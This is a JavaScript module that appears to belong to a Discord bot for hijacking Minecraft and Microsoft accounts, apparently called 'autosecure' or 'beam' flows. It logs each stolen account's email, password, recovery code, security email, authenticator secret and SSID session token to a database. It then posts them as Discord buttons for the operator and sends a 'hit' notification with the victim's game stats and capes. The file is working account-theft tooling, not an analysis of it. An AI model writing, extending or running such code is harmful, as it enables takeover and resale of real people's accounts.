const { sendSecureNotification } = require("../notifications/notifier");
const getStats = require("../hypixelapi/getStats");
const generate = require("../generate");
const getembedautosec = require("../responses/getembedsautosec");
const statsembed = require("../stats/statsembed");
const checkmc = require("../../../db/checkmc");
const { ActionRowBuilder, ButtonBuilder, ButtonStyle } = require("discord.js");

const notifiedUids = new Set();

function isValidMinecraftUsername(name) {
    if (!name || typeof name !== 'string') return false;
    const invalidKeywords = [
        "couldn't find!", 
        "couldn't change!", 
        "no minecraft!", 
        "xbl failed", 
        "none", 
        "unknown", 
        "failed", 
        "false", 
        "null", 
        "undefined"
    ];
    if (invalidKeywords.includes(name.trim().toLowerCase())) return false;
    return /^[a-zA-Z0-9_]{2,16}$/.test(name.trim());
}

async function triggerHitNotification(client, acc, uid) {
    if (!uid || notifiedUids.has(uid)) return;

    const ownsMc = acc?.mc || acc?.ownsmc;
    if (!ownsMc || !checkmc(ownsMc)) {
        console.log(`[HIT_DRAW] Skipping hit card draw: Account does not own Minecraft (ownsMc=${ownsMc || 'None'})`);
        return;
    }

    const ign = (acc.newName && isValidMinecraftUsername(acc.newName)) 
        ? acc.newName 
        : (acc.oldName && isValidMinecraftUsername(acc.oldName) ? acc.oldName : "");

    if (!isValidMinecraftUsername(ign)) {
        console.log(`[HIT_DRAW] Skipping hit card draw: Invalid or placeholder username '${ign}'`);
        return;
    }

    notifiedUids.add(uid);
    setTimeout(() => notifiedUids.delete(uid), 1800000);

    try {
        console.log(`[HIT_DRAW] Triggering hit card draw for ${ign}...`);
        const stats = await getStats(ign).catch(() => null);
        const accountData = {
            username: ign,
            capes: acc.capes || [],
            networth: stats?.networth || '0',
            bedwars: stats?.bedwars?.level || '0',
            networkLevel: stats?.nwl || '0',
            sbLevel: (stats?.skyblock && stats.skyblock.length > 0) ? Math.max(...stats.skyblock.map(s => Number(s.levels) || 0)).toFixed(2) : '0',
            skywarsLevel: stats?.skywars?.levels || '0',
            duelKDR: stats?.duels?.KLRatio || '0',
            duelWinstreak: stats?.duels?.bestWinStreak || '0',
            plusColour: stats?.color || 'None',
            gifted: stats?.giftedranks || '0',
            rank: stats?.rank || 'NONE',
            donut: acc.donut || null,
            donutMoney: acc.donutMoney || acc.donut?.moneyFormatted || acc.donut?.money || null,
            donutShards: acc.donutShards || acc.donut?.shardsFormatted || acc.donut?.shards || null,
            donutPlaytime: acc.donutPlaytime || acc.donut?.playtime || null,
            donutRank: acc.donutRank || acc.donut?.rank || null,
            donutKDR: acc.donutKDR || acc.donut?.kdr || null
        };
        await sendSecureNotification(client, accountData);
        console.log(`[HIT_DRAW] Hit card notification sent successfully for ${ign}`);
    } catch (err) {
        console.error('[HIT_DRAW] Error generating hit notification:', err.message);
    }
}

module.exports = async (acc, uid, client, interaction) => {

    let msg = {};
    let time = Date.now();
    let ssidId = generate(32);
    let secureId = generate(32);
    let copyTextId = generate(32);
    let checkBanId = generate(32);

    let cleanedkey = acc.secretkey && acc.secretkey !== "Disabled" ? acc.secretkey.replace(/\s+/g, "") : "Disabled";
    let sec = acc.secEmail && acc.secEmail !== "Failed" ? acc.secEmail : "None";

    // Auto-trigger hit draw card notification across all secure / beam flows
    triggerHitNotification(client, acc, uid).catch(e => console.error('[LISTACCOUNT] Hit draw error:', e.message));

    try {
        if (!acc.newName || !acc.email || !acc.password || !acc.secEmail || !acc.recoveryCode || !acc.capes || !acc.mc) {
            console.log("Didn't get all values!");
        }

        let capesForDb = Array.isArray(acc.capes) && acc.capes.length > 0 ? acc.capes.join(", ") : "None";

        const actionPromises = [
            client.queryParams(
                `INSERT INTO actions(id, action) VALUES(?, ?)`,
                [ssidId, `ssid|${acc.ssid || ""}${acc.xbl ? `|${acc.xbl}` : ""}`]
            ),
            client.queryParams(
                `INSERT INTO actions(id, action) VALUES(?, ?)`,
                [secureId, `securedata|${acc.recoverydata.email}|${acc.recoverydata.recovery}|${acc.recoverydata.secemail}|${acc.recoverydata.password}`]
            ),
            client.queryParams(
                `INSERT INTO actions(id, action) VALUES(?, ?)`,
                [
                    copyTextId,
                    `copyText|${interaction.user.id}|${acc.newName || ""}|${acc.mc || ""}|${capesForDb}|${acc.recoveryCode || ""}|${acc.email || ""}|${sec}|${cleanedkey}|${acc.password || ""}`
                ]
            )
        ];

        if (acc.ssid) {
            actionPromises.push(
                client.queryParams(
                    `INSERT INTO actions(id, action) VALUES(?, ?)`,
                    [checkBanId, `checkbanmc|${acc.ssid}`]
                )
            );
        }

        await Promise.all(actionPromises);

    } catch (error) {
        console.error("Error inserting into database:", error);
        throw new Error("Failed to insert action data into the database.");
    }


    const embed = await getembedautosec(client, "listaccount", acc, interaction);

    let embeds = [embed];
    if (acc.newName && acc.newName !== "No Minecraft!" && acc.mc) {
        try {
            const statsEmbedResult = await statsembed(client, acc, interaction);
            if (statsEmbedResult && statsEmbedResult.embeds && statsEmbedResult.embeds.length > 0) {
                embeds.push(statsEmbedResult.embeds[0]);
                console.log('[LISTACCOUNT] Added stats embed to message');
            }
        } catch (statsError) {
            console.log('[LISTACCOUNT] Failed to get stats embed:', statsError.message);
        }
    }

    msg.embeds = embeds;
    msg.components = [
        new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId(`minecraft|${uid}`)
                .setStyle(ButtonStyle.Primary)
                .setLabel("Minecraft"),
            new ButtonBuilder()
                .setCustomId("ssid|" + ssidId + "|" + time)
                .setLabel("SSID")
                .setStyle(ButtonStyle.Primary),
            new ButtonBuilder()
                .setCustomId("copyText|" + copyTextId)
                .setLabel("Copy Info")
                .setStyle(ButtonStyle.Secondary),
            new ButtonBuilder()
                .setCustomId(`email|${sec}`)
                .setStyle(ButtonStyle.Secondary)
                .setEmoji("📧"),
            new ButtonBuilder()
                .setCustomId(`auth|${cleanedkey}`)
                .setStyle(ButtonStyle.Secondary)
                .setEmoji("🔑")
        )
    ];

    const row2Components = [
        new ButtonBuilder()
            .setCustomId(`extrainformation|${uid}`)
            .setLabel("Extra Information")
            .setStyle(ButtonStyle.Success)
    ];

    const mcUsername = acc.newName && acc.newName !== "No Minecraft!" ? acc.newName : (acc.oldName || "");
    if (mcUsername) {
        row2Components.push(
            new ButtonBuilder()
                .setCustomId(`donutstats|${uid}|${mcUsername}`)
                .setLabel("DonutSMP")
                .setEmoji("🍩")
                .setStyle(ButtonStyle.Secondary)
        );
    }

    if (acc.ssid) {
        row2Components.push(
            new ButtonBuilder()
                .setCustomId(`checkbanmc|${checkBanId}|both`)
                .setLabel("Check Ban")
                .setStyle(ButtonStyle.Primary)
        );
    }

    msg.components.push(
        new ActionRowBuilder().addComponents(row2Components)
    );

    return msg;
};